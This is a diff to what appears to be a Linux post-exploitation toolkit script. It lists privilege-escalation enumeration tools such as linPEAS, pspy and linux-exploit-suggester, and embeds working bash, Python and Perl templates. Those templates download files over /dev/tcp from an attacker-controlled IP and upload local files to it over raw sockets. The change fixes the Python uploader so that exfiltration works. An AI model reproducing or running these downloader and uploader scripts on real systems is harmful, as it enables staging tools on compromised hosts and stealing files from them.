@@ -49,7 +49,7 @@ pspy/pspy32;noexec;;;;b3b3d7ea8ccf37813c67ae0c58ab0cff
 pspy/pspy64;noexec;;;;e04a36bb5444f2275990567614e1f509
 linuxprivchecker/linuxprivchecker.py;;;python;;1919961f57f12d2f2929988440f1faf1
 privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh;;;sh;;bf2f7f4cdda40e2c9409f43da4f677f3
-linux-smart-enumeration/lse.sh;;;sh;;9c085090cdc827fc7425fc3e162b7a43
+linux-smart-enumeration/lse.sh;;;sh;-i;9c085090cdc827fc7425fc3e162b7a43
 linux-exploit-suggester/linux-exploit-suggester.sh;;;bash;;dbd2d65f18ce8e17d999eca65df899c7
 linux-exploit-suggester-2/linux-exploit-suggester-2.pl;;;perl;;56c5b3fa2d7a59d034a9096edc16d328
 END
@@ -72,7 +72,7 @@ SH_DOWNLOADER_NAME="downloader.sh"
 SH_DOWNLOADER="#!/bin/bash\nip=\"$OWN_IP\"\nport=$DOWLOADED_PORT\nfile_to_download=\$1\noutput=\$2\nif [ -z \"\$file_to_download\" ] && [ -z \"\$output\" ]\nthen\necho \"Usage: downloader.sh <remote-file-to-download> <local-output-path>\"\nexit 1\nfi\nexec 3<>/dev/tcp/\"\$ip\"/\"\$port\"\necho -e \"GET /\$file_to_download HTTP/1.1$n""Host: \$ip$n""Connection: close$n$n\" >&3\nfor i in `seq 1 7`;\ndo\nread -u 3 line\nif [[ \$line =~ ^HTTP/1\.0[[:blank:]]([0-9]{3}) ]]\nthen\nif [ \${BASH_REMATCH[1]} != \"200\" ]\nthen\nexit 1\nfi\nfi\ndone\nwhile [ 1 ]\ndo\nread -u 3 line\nif [ -z \"\$line\" ]\nthen\nbreak\nfi\necho \$line >> \$output\ndone\nexec 3<&-\nexit 0\n"
 
 PY_UPLOADER_NAME="uploader.py"
-PY_UPLOADER="import socket,sys,os\ntarget_host = \"$OWN_IP\"\ntarget_port = $UPLOADED_PORT\nif len(sys.argv) != 2 or os.path.isfile(sys.argv[1]) == False:\n\tprint(\"Usage: uploader.sh <local-file-to-upload>\")\n\tsys.exit(1)\nfile_to_upload = sys.argv[1]\ndata = b''\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_host,target_port))\nf=open(file_to_upload, \"rb\")\ndata = f.read()\ns.send(data.encode())\nf.close()\ns.close()\nsys.exit(0)"
+PY_UPLOADER="import socket,sys,os\ntarget_host = \"$OWN_IP\"\ntarget_port = $UPLOADED_PORT\nif len(sys.argv) != 2 or os.path.isfile(sys.argv[1]) == False:\n\tprint(\"Usage: uploader.sh <local-file-to-upload>\")\n\tsys.exit(1)\nfile_to_upload = sys.argv[1]\ndata = b''\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_host,target_port))\nf=open(file_to_upload, \"rb\")\ndata = f.read()\ns.send(data)\nf.close()\ns.close()\nsys.exit(0)"
 PL_UPLOADER_NAME="uploader.pl"
 PL_UPLOADER="use Socket;\nuse warnings;\nuse strict;\nmy \$remote = '$OWN_IP';\nmy \$port = $UPLOADED_PORT;\nmy \$file_to_upload = \$ARGV[0];\nif (!defined(\$file_to_upload) || ! -e \$file_to_upload) {\n    print \"Usage: uploader.sh <local-file-to-upload>\\n\";\n    exit(1);\n}\nmy \$proto = getprotobyname('tcp');\nmy(\$sock);\nsocket(\$sock, AF_INET, SOCK_STREAM, \$proto) or exit(1);\nmy \$iaddr = inet_aton(\$remote) or exit(1);\nmy \$paddr = sockaddr_in(\$port, \$iaddr);\nconnect(\$sock , \$paddr) or exit(1);\nopen(my \$fh, '<', \$file_to_upload) or exit(1);\nwhile(my \$row = <\$fh>){\n    send(\$sock, \$row, 0) or exit(1);\n}\nclose(\$fh);\nclose(\$sock);\nexit(0);"
 SH_UPLOADER_NAME="uploader.sh"
